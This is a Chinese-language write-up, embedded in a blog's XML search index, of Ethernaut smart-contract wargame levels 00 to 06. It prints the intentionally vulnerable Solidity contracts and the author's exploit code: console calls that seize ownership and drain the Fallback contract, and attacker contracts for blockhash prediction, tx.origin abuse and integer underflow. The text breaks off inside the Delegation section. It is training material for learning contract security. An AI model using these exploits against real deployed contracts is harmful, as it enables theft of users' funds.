<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ethernaut区块链安全闯关00-06writeup</title>
      <link href="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/"/>
      <url>/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut区块链安全闯关00-06writeup"><a href="#Ethernaut区块链安全闯关00-06writeup" class="headerlink" title="Ethernaut区块链安全闯关00-06writeup"></a><strong>Ethernaut区块链安全闯关00-06writeup</strong></h1><h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00 Hello Ethernaut"></a><strong>00 Hello Ethernaut</strong></h2><p>这关主要是熟悉环境，知道如何用前端跟区块链上的智能合约进行交互；</p><p>用前端交互主要是用web3.js和ether.js这两个库，也就是用JavaScript，因此我们要用控制台，F12打开控制台。</p><p>这个ethernaut用的是web3.js，web3.js有一些内置函数或者功能，可以输入help()获取。</p><p>我们生成实例，就可以开始用contract和智能合约交互了，输入contract，我们可以看到合约的ABI，这是一个json，里面有这个合约的函数；题目中提示我们输入contract.info()查看合约信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;You will find what you need in info1().&#x27;</span><br></pre></td></tr></table></figure><p>contract.info1()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;</span><br></pre></td></tr></table></figure><p>contract.info2(“hello”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;The property infoNum holds the number of the next info method to call.&#x27;</span><br></pre></td></tr></table></figure><p>(contract.infoNum()).toString（原因是这里的数据类型是uint8，八位无符号整数，通关后在源码看到）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;42&#x27;</span><br></pre></td></tr></table></figure><p>contract.info42()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;theMethodName is the name of the next method.&#x27;</span><br></pre></td></tr></table></figure><p>contract.theMethodName()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;The method name is method7123949.&#x27;</span><br></pre></td></tr></table></figure><p>contract.method7123949()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;If you know the password, submit it to authenticate().&#x27;</span><br></pre></td></tr></table></figure><p>contract.password()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;ethernaut0&#x27;</span><br></pre></td></tr></table></figure><p>contract.authenticate(‘’ethernaut0’’)</p><p>最后提交，结束。源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = &quot;The method name is method7123949.&quot;;</span><br><span class="line">    bool private cleared = false;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;You will find what you need in info1().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) &#123;</span><br><span class="line">        return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;</span><br><span class="line">            return &quot;The property infoNum holds the number of the next info method to call.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Wrong parameter.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;theMethodName is the name of the next method.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;If you know the password, submit it to authenticate().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">            cleared = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) &#123;</span><br><span class="line">        return cleared;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知识点：智能合约ABI、web3.js&amp;ether.js和toString方法</p><h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01 Fallback"></a><strong>01 Fallback</strong></h2><p>这关的任务有两个：</p><p>1.获取合约的所有权</p><p>2.提走智能合约里的钱</p><p>源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先构造函数初始化一些变量，将msg.sender的值赋给owner；msg.sender指的是调用函数的人的地址，在这里理解为合约所有者调用了构造函数，我们要获取所有权就必须自己调动包含owner&#x3D;msg.sender的函数。构造函数我们当然是无法调动的，那就有contribute和receive，receive函数是fallback函数的一种，在接收到以太币转账的时候触发，允许调用receive的人获取合约所有权，但是转账数额必须大于0且贡献值大于0；而contribute函数有payable标识符，可以接受以太币，但每次不超过0.001ETH且必须贡献者大于所有者，也就是要转账最少1000&#x2F;0.01次，不太现实，因此考虑receive函数，但是我们要先用contribute转账以确保贡献值大于0，再用receive转账方可获取所有权。然后因为满足了withdraw提现函数的修饰符，所以可以提钱将余额变成0</p><p>注：对于payable标识符的函数，转账方式和sendTransaction()是一样的</p><p>sendTransaction({value:(单位是Wei，所以数字不能过小了),to:(address),from:(address)})</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&quot;0.0001&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&quot;0.0001&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br></pre></td></tr></table></figure><p>知识点：Fallback函数、构造函数、modifier自定义标识符，payable标识符、sendTransaction，智能合约所有权，msg.sender</p><h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a><strong>02 Fallout</strong></h2><p>这关也是获取智能合约的所有权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析合约，发现合约的致命错误，构造函数写错了：</p><p>新版本的智能合约用constructor标识符标识构造函数；</p><p>旧版本的智能合约构造函数是和合约同名的函数。但这里明显名字错了，所以不再是构造函数，所以可以外部调用，调用即可获取合约所有权。</p><p>知识点：旧版构造函数安全问题</p><h2 id="03-CoinFlip"><a href="#03-CoinFlip" class="headerlink" title="03 CoinFlip"></a><strong>03 CoinFlip</strong></h2><p>这个关卡的要求是连续才对硬币10次，否则胜利清零，源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码，声明了三个变量consecutiveWins，lastHash和FACTOR,初始化consecutiveWins为0，也就是猜硬币胜利次数的计数器；只有一个flip函数用于猜硬币，输入布尔值为参数。函数通过获取上一个区块的编号哈希，转换类型为256位无符号整数blockValue，其可能区间为[0,2^256^-1]，然后检查如果blockValue没有变化，回滚交易，然后再把新的blockValue赋值给lastHash用作检查，确保每次猜硬币结果都不一样。然后用blockValue除FACTOR取商，如果是1，硬币的side记为true，反之为false；FACTOR实际上是2^255^，如果blockValue在[0,2^255^-1]，硬币是false，概率为1&#x2F;2，因此true也为1&#x2F;2。然后检查，如果参数值_guess等于硬币的面，那么计数器加1，反之清0。</p><p>这里再用前端调用合同的flip函数真的就是在盲猜了，连续猜对十次还是很难的。这里我们就需要自己写一份智能合约调用这份智能合约，这样由于在同一个区块内，所以可以提前预知blockValue，做到连续猜对十次。这里用Remix IDE写代码并且编译、部署。攻击合约如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  //指定开源许可证，MIT 许可证是一种非常宽松的开源许可证，允许用户自由地使用、复制、修改和分发代码，甚至可以用于商业项目。</span><br><span class="line">pragma solidity ^0.6.12; //指定solidity编译器的版本，版本大于0.6.12</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; //导入SafeMath库，进行安全数学运算，防止结果溢出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface flip_coins &#123;</span><br><span class="line">    function flip(bool _guess) external  returns (bool);</span><br><span class="line">&#125;//用接口调用目标合约的函数，注意把标识符改为external</span><br><span class="line">contract FLIPCOIN&#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address levelInstance;//声明levelInstance作为目标合约地址</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    constructor(address _levelInstance) public &#123;</span><br><span class="line">        levelInstance=_levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line">    function Guess_side() public returns(bool)&#123;</span><br><span class="line">        uint256 hash_prediction=uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 num_prediction=hash_prediction.div(FACTOR);</span><br><span class="line">        bool result_prediction=num_prediction==1?true:false;//预知结果</span><br><span class="line">        if (result_prediction==true)&#123;</span><br><span class="line">            flip_coins(levelInstance).flip(true);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            flip_coins(levelInstance).flip(false);</span><br><span class="line">        &#125;//接口连接到智能合约，调用函数，填入预知结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写好代码后，ctrl+s编译，如果出现绿色对勾，说明编译无误；编译时记得选好编译器版本</p><p><img src="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/%E7%BC%96%E8%AF%91%E5%99%A8.png" alt="编译器"></p><p>然后部署合约,选Injected Provider，选好你要部署的合约，delpoy边上填入构造函数的参数</p><p><img src="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A61.png" alt="部署合约1"></p><p>在这里连续点击十次，调用十次函数即可</p><p><img src="/2025/02/23/Ethernaut%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E9%97%AF%E5%85%B300-06writeup/%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0.png" alt="调用函数"></p><p>知识点：solidity随机数生成机制；solidity函数；solidity接口；remix ide的用法；SafeMath库；solidity开源许可证；solidity编译器</p><h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a><strong>04 Telephone</strong></h2><p>这题没有明说，但是也是要获得合约所有权</p><p>源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码相对简单，先在构造函数里初始化合约所有者为关卡地址，然后只有一个函数changeOwner，输入参数更改合约的所有者，条件是原始发起交易的账户tx.origin不是调用函数的实体，因此我们这里不能直接前端调用，只能写智能合约调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">interface telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;  </span><br><span class="line">&#125;</span><br><span class="line">contract calling&#123;</span><br><span class="line">    address lvlInstance;</span><br><span class="line">    constructor(address _lvlInstance) public&#123;</span><br><span class="line">        lvlInstance=_lvlInstance;</span><br><span class="line">    &#125;</span><br><span class="line">    function CALLING(address _me) public &#123;</span><br><span class="line">        telephone(lvlInstance).changeOwner(_me);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后呼叫函数的时候填入自己的地址，改变所有权即可通关。</p><p>知识点：利用tx.origin漏洞钓鱼攻击</p><h2 id="05-token"><a href="#05-token" class="headerlink" title="05 token"></a><strong>05 token</strong></h2><p>这题的目标是想办法增加自己的balances，增加成功即可过关；源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数初始化了关卡地址的余额，并在题干告诉我们我们自己的余额是20，这两个数据都储存在balances这个映射内；然后定义一个transfer函数，规定调用函数实体账户内的余额必须大于转账的数值，才能调用函数，然后在balances映射内做出相应的变化；再定义一个balanceOf，可以查询balances内的余额</p><p>想要增加余额，就必须写一份智能合约作为一个新的实体调用实例的智能合约把自己的余额分出来。但是虽然智能合约也只有20，但是实际上可以转出大于20的余额，因为这个合约没有用SafeMath，存在整数溢出漏洞，由于余额是无符号256位整数，那么即使我的_value&gt;20,由于uint256没有符数，所以会下溢出，最后如果 _value比较小，会得到一个很大的整数，总之require永远满足差值大于0，exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.11;</span><br><span class="line">interface token_add &#123;</span><br><span class="line">    function transfer(address _to, uint256 _value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line">contract give_me&#123;</span><br><span class="line">    address ether_instance;</span><br><span class="line">    constructor(address _ether_instance) public &#123;</span><br><span class="line">        ether_instance=_ether_instance;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_token(address my_add,uint256 value) public &#123;</span><br><span class="line">        token_add(ether_instance).transfer(my_add,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用get_token函数，转账即可</p><p>知识点：solidity整数溢出漏洞</p><h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a><strong>06 Delegation</strong></h2><p>这题目标是获得合约的所有权。启动实例后输入contract.abi()，发现其指向是Delegation合约。整个的源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>提示中有提到，delegatecall很关键，所以查一下delegatecall。发现delegatecall和call都是合约调用其外部代码的方法，还有一个callcode弃用了，就看前两个吧。delegatecall和call的区别在于，call是调用外部合约函数，改变外部合约状态，delegatecall是调用外部合约函数，改变自身合约状态。</p><p>因此，我们可以用delegatecall调用Delegate合约的pwn()函数以改变owner的值，为此，我们需要触发fallback，所以我们要发起交易，且设定好msg.data，msg.data是原始调用数据，包含在交易中，其构成为函数选择器+参数编码，函数选择器即是 <strong>Keccak256 哈希的前 4 字节</strong>；参数编码是对参数值编码，可以分为定长类型和动态类型，定长类型包括uint256，address等等，动态类型包括数组，string和bytes等等。对于定长类型直接将数据补足到32位即可，动态类型要有偏移量，数据长度，和数据类型；将这些和函数选择器拼接起来后即为完整的msg.data</p><p>pwn()没有参数，所以直接：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 